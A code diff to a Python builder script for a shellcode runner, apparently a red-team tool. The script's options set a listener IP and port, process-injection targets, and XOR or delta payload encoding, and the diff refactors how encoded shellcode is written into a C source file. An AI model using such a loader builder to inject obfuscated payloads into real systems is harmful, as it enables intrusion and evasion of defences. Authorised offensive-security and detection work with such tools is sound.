@@ -28,7 +28,8 @@ parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
 parser.add_argument('-P', '--lport', help='Listener port for templates.')
 parser.add_argument('--export', help='Exported function name for DLL.')
 parser.add_argument('--process', help='Target process name for creation or remote injection. Default is RuntimeBroker.exe.')
-parser.add_argument('--xor', help='Use XOR encryption. Default is Red Siege\'s delta encoder.', action="store_true")
+parser.add_argument('--xor', help='Use XOR encryption.', action="store_true")
+parser.add_argument('--delta', help='Use delta encoding from Red Siege\'s delta encoder.', action="store_true")
 parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 args = parser.parse_args()
 
@@ -90,11 +91,11 @@ def writePayload(shellcode, blob):
 					line += f"0x{shellcode[j].to_bytes(1).hex()}, "
 				else:
 					line += f"0x{shellcode[j].to_bytes(1).hex()}" + " };\n"
-		elif "BYTE pPayload[]" in line and not args.xor:
+		elif "BYTE pPayload[]" in line and args.delta:
 			line = "\n"
 		
 		# Update size line
-		if "SIZE_T sPayloadSize" in line and args.xor:
+		if "SIZE_T sPayloadSize" in line:
 			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
 
 		newLines.append(line)
@@ -102,10 +103,7 @@ def writePayload(shellcode, blob):
 	# Update decryption protocol
 	for i in range(0,len(newLines)):
 		if "SIZE_T sPayloadSize" in newLines[i]:
-			if args.xor:
-				newLines[i+1:i+1] = blob
-			else:
-				newLines[i+1:i+1] = blob
+			newLines[i+1:i+1] = blob
 
 	# Write to runner
 	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
